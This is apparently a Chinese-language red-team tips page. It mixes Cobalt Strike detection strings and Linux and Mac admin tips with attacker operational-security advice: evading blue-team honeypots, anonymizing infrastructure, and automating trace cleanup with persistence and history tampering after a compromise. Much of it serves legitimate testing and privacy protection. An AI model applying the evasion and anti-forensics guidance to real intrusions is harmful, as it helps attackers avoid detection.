cert="73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F"
```

---

红队常用的扫描器特征
- https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/RedTeam.txt

---

"Beacon.dll"、"beacon.x64.dll" 和 "ReflectiveLoader" 默认是 CS Beacon 的硬编码特征。当寻找内存中的后门时，可以利用这一点

![](./assets/img/2.png)

---

## Linux

分享一篇关于jq的中文教程,讲的非常详细,推荐
- https://mozillazg.com/2018/01/jq-use-examples-cookbook.html

还有一个可以在线调试jq命令的工具
- https://jqplay.org/

---

- https://github.com/jpmens/jo - 生成 json 格式数据的小工具

---

- https://github.com/eficode/wait-for 帮助你监测目标是否启动

---

vultr 的 Fedora 35 版本 vps 默认无 dns 设置,我无法理解 🤡
```
echo "nameserver 8.8.8.8" > /etc/resolv.conf
systemctl restart systemd-resolved
```

---

远程修改文件有时候还是图形化方便些，如果喜欢 vscode 这种编辑器,可以试试 https://github.com/cdr/code-server ,在目标上配置一个远程的 vscode 服务器,做调试、跑脚本都很方便

---

推荐一个很方便的 linux 文件管理工具 ranger, 具有 Vim 式的操作方式.

```bash
apt install ranger && pip install ranger-fm
ranger

# 使用 h,j,k,l 来进行光标的移动, 来穿越在不同的文件夹中
# q 退出
# S 来进行当前光标所在的文件夹中 exit 命令重新回到 ranger 程序当中去
```

---

当运行一个程序发现缺少库时,可以使用 apt-file 进行搜索，然后安装对应的软件包
```bash
apt install apt-file
apt-file update
apt-file search <xxx>
apt install <xxx>
```

> 来自项目 : [firmianay/Tips-for-Geek](https://github.com/firmianay/Tips-for-Geek)

---

用于文本处理的几个工具
- tr : 多功能处理
- https://github.com/tomnomnom/anew : 自动去重
- jq : json 格式化
- expand/unexpand : 空格和 TAB 转换

---

命令行下截图的一种不错的方式
- asciinema

---

神器级工具,Linux 下的 everything
- https://github.com/junegunn/fzf

![](./assets/img/6.png)

---

推荐一个 linux 小工具 trash-cli 用于移动文件到回收站，同时会记录文件的原地址、删除日期和权限。trash-cli 和 KDE、GNOME、XFCE 使用同一个回收站，你可以在命令行或脚本运行 trash-cli。一定程度上可以代替 rm
- 地址:https://github.com/andreafrancia/trash-cli/blob/master/README_zh-CN.rst

---

一个探针工具，可用于实时监测服务器运行状况
- 地址:https://github.com/naiba/nezha

---

linux 使用过程中经常出现安装软件包失败的问题,很多情况是遇到了锁,可以直接删除(运维兄弟们,生产环境下不要用啊🤣🤣🤣)
- debian系
    报错：无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用)
    ```bash
    rm -rf /var/cache/apt/archives/lock
    rm -rf /var/lib/dpkg/lock-frontend
    rm -rf /var/lib/dpkg/lock
    rm /var/lib/dpkg/lock
    rm /var/lib/apt/lists/lock
    ```
- redhat系
    报错：/var/run/yum.pid 已被锁定,PID 为 xxxx 的另一个程序正在运行.
    ```bash
    rm -f /var/run/yum.pid 2> /dev/null
    ```
- 特立独行的 Fedora
    报错：Waiting for process with pid <xxx> to finish.
    ```bash
    rm -f /var/cache/dnf/metadata_lock.pid 2> /dev/null
    ```

---

在 linux 中安装一些组件的依赖时会有比如 python-dev 和  python-devel 的区别,devel 或 dev 包主要是供开发用，这代表不同的发行版本，redhat 系是 devel ，debian 系是 dev

---

修改 Linux 的 DNS 一直是一个问题，每次开机 dns 都会重置，debian 下可以使用 dns 管理工具一劳永逸的解决
- 安装
    ```bash
    apt-get install -y resolvconf
    ```
- 配置
    ```bash
    echo "nameserver 223.5.5.5" > /etc/resolvconf/resolv.conf.d/head
    ```
- 更新
    ```bash
    resolvconf -u
    ```
- 若需要更改 DNS,请修改 `/etc/resolvconf/resolv.conf.d/head` 文件

---

如果在 red hat 系发行版中需要装开发工具,建议安装 Development Tools ，可以将常用软件，一次性装好
- 安装
    ```bash
    yum groupinstall -y "Development Tools"
    ```

---

分享几个linux性能调优的技巧
```bash
sync    # sync 命令做同步,以确保文件系统的完整性,将所有未写的系统缓冲区写到磁盘中,包含已修改的 i-node、已延的块 I/O 和写映射文件.否则在释放缓存的过程中,可能会丢失未保存的文件.
echo 1 > /proc/sys/vm/drop_caches   # 清理 pagecache(页面缓存)
echo 2 > /proc/sys/vm/drop_caches   # 清理 dentries(目录缓存)和inodes
echo 3 > /proc/sys/vm/drop_caches   # 清理 pagecache、dentries 和 inodes
sync

# 取消开启文件数限制
ulimit -n 65535

# 优化内存
echo 128 > /proc/sys/vm/nr_hugepages        # 默认为0
sysctl -w vm.nr_hugepages=128
```

---

最近在 linux 搭建 vpn 服务的时候遇到时间和时区不同步的情况，分享下解决方案

查看当前时区
```bash
timedatectl
```

修改当前时区：
```bash
timedatectl set-timezone Asia/Shanghai
# 或
cp  /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime
```

---

由于 python 官方停止了对 python2 的维护，以后大部分和 pip2 有关的操作都会报下面这个错，我预估一下，这个应该是以后我们遇到最常见的问题之一, 解决方案很简单, 安装指定版本的 pip2 即可

![](./assets/img/3.png)

```
curl https://bootstrap.pypa.io/2.7/get-pip.py --output get-pip.py
python get-pip.py
```

---

Python 2 在 Ubuntu 20 上不存在，但是有时候还是需要的。可以通过以下命令安装
```bash
apt-get install python-is-python2
```

---

## Mac

mac 下 sudo 用 touchid 代替密码输入

```
sudo vim /etc/pam.d/sudo

在第二行添加
auth sufficient pam_tid.so
```

保存的时候可能要用 `:wq!`

> 来自文章: https://sixcolors.com/post/2020/11/quick-tip-enable-touch-id-for-sudo/

---

在做项目时经常要来回切换多个工具去复制凭证、复制命令啥的，推荐 alfred 里自带的剪切板工具，非常好用

---

## 防蓝队

- 使用 干净 的浏览器 (没有任何 cookie), 或者隐身模式
- 修改系统默认浏览器, 或者就改成 burp 自带的浏览器, burp 要挂好代理, 测试方法, bp 自带浏览器访问 cip.cc 或 ifconfig.me
- burp 用新一点的版本, 老版本自带的浏览器可能会被蓝队蜜罐用浏览器的 0day/1day 反制
- 交流传输域名或者 ip 需要加字符(防止聊天工具有预加载暴露出口 ip, 或者队友误点)
    - 例如: www.bai【】du.com
- mysql 连接用云服务器的命令行连接, 防止 mysql 蜜罐
    - mysql 蜜罐读你的本机微信信息
    - mysql 蜜罐读你的cs配置
- java 反序列化工具尽量放到单独的云服务器上，这个云服务器上面不要存敏感数据，属于即用即消的。因为开源的很多都是可以被反制的
    - 或者说用 go 去实现
- java 命令行工具 (jar) 要挂代理，或者走 proxifer
- clash 工具要设置不允许局域网连接(看情况)
- 成果不要发在钉钉、qq 群、腾讯文档、语雀、石墨文档、trello 等在线文档，最好放在内网自建服务上, 随项目随用随销
- 微信、钉钉传文件加密压缩, 敏感信息先 base64 一遍
- 及时清理微信、钉钉聊天记录、设备缓存
- 清理本地浏览器记录、缓存、保存密码
- 重要文档本地加密压缩
- 如果是 mac，虚拟机运行的时候注意下共享目录，防止泄漏文件
- goland、vscode 等 IDE 打开源码要小心, 优先用 notepad++、sublime 这种打开看, 防止 IDE 反制

---

## 隐私保护

- 钉钉 [手机号/邮箱]
    - 隐私: 在 [添加好友] 功能点，可以通过手机号或邮箱查找人员
    - 保护: [我的]-[设置]-[隐私]-[添加我的方式]
- 飞书 [手机号/邮箱]
    - 隐私: 在 [添加外部联系人] 功能点，可以通过手机号或邮箱查找人员
    - 保护: [设置]-[隐私]-[添加我的方式]-[可通过以下方式搜索到我]
- 脉脉 [手机号/姓名/第三方]
    - 隐私: 脉脉支持通过读取手机联系人自动构建人际关系网,如果多位朋友的手机中有你的联系方式且备注完善，那你的用户画像会很精准
    - 隐私: [人脉]-里面直接输手机号查找人员职业信息
    - 保护: [隐私]-[谁可以看我的资料]-[搜索]-[不允许通过手机号搜索到我]
    - 保护: [隐私]-里面的这些选项里能选仅自己的就选
    - 注销: [更多设置]-[账号安全]-[申请注销账号]
- 微信 [手机号]
    - 隐私: 在 [添加好友] 功能点，可以通过手机号查找人员
    - 保护: [我]-[设置]-[朋友权限]-[添加我的方式]
    - 攻防期间: HW时期微信不接受任何好友请求(或者直接屏蔽朋友圈),朋友圈设置3天可见(防止好友列表里的内鬼)
- 百度
    - 隐私: 百度账号找回密码、百度网盘添加好友
    - 保护: 没有比较好的手段,还是做好前期工作,清空浏览器,小心 jsonp 吧
- reg007 [手机号/邮箱]
    - 隐私: 通过手机号，邮箱查询你注册过的网站
    - 保护: 搜索你自己的手机号,结果页面申请屏蔽自己搜索结果(聊胜于无)
- 支付宝 [手机号/邮箱]
    - 隐私: 通过手机号，邮箱找到你支付宝账号
    - 隐私: 通过手机号给你转账,查看你的地区,查看你的姓名最后一位
    - 保护: [设置]-[隐私]-[常用隐私设置]-[添加我的方式]
    - 保护: [设置]-[隐私]-[常用隐私设置]-[向好友公开我的真实姓名]
    - 保护: [设置]-[隐私]-[常用隐私设置]-[运行通过以下方式找到我]
- qq
    - 隐私: 通过手机号查找人员
    - 保护: qq空间不要设置为公开
    - 保护: [设置]-[隐私]-[发现我的方式]
    - 保护: [设置]-[隐私]-[加我为好友的方式]
- 微博
    - 隐私: 通过手机号查找人员
    - 保护: [设置]-[隐私设置]-[通讯录]
- github
    - 隐私: 个人主页很多人会填写自己的常用邮箱,甚至联系方式
    - 保护: 建议注册个匿名邮箱,以及不要留自己的联系方式
- 淘宝
    - 隐私: 通过通讯录查找人员
    - 保护: [设置]-[隐私]-[找到我的方式]
- 小红书
    - 保护: [设置]-[隐私设置]
- 美团
    - 保护: [设置]-[隐私管理]-[饭小圈设置]
- 快手/抖音/皮皮虾/最右/即刻 等短视频平台
    - 保护: [设置]-[隐私设置]
    - 最好像抖音一样设置为私密账号
- twitter
    - 保护: [设置]-[安全性和帳戶存取]-[安全性]-[密碼重設保護]
    - 保护: [设置]-[隱私和安全]-[你的Twitter活動]-[可搜尋性和聯絡人]
- telegram
    - 保护: [设置]-[Privacy and Security]-[Phone Number]
    - 保护: 用户名置空
- 不同平台密码最好不一样 (推荐使用密码管理器 1Password)
- 不同平台头像和名称不要一致, 干扰蓝队社工
- 国内国外平台注册邮箱最好不一样 (国内随便, 国外用 gamil 或者 proton, 邮箱前缀也要不同, 注意!!!)
- 所有平台能开 opt 就开
- 不用的旧设备及时清空记录、格式化

---

## 基础设施匿名化

- 不同基础设施服务放单独服务器(不同区域 不同密码)
- 所有服务的账号密码、监听器、配置不要带有明显特征的字符(比如 qax/360/sxf 这类)
- 上线方案要多做几套
    - linux 上线方案
    - windows 上线方案
- 代理也要多做几套(包括免杀)
- 关于基础设施在阿里云上的情况
    - 涉及到明文流量的尽量不要用阿里云服务器。因为有备案拦截
- 设计上采用 oss 交互的工具，accesskey 权限要管控好, 低权限给工具用，高权限给平台用
- 自用平台不管是搭建在内网还是外网都要加权限认证(basic/ldap/账号密码)
- oss bucket 要多做几套，拆分出来，不能被一锅端
- 代理池要自动换 ip,最好做成透明代理
- 痕迹清理尽量自动化, 比如连上目标自动把上传的木马删除并做权限维持, 改 history 记录配置

---

> create by ffffffff0x
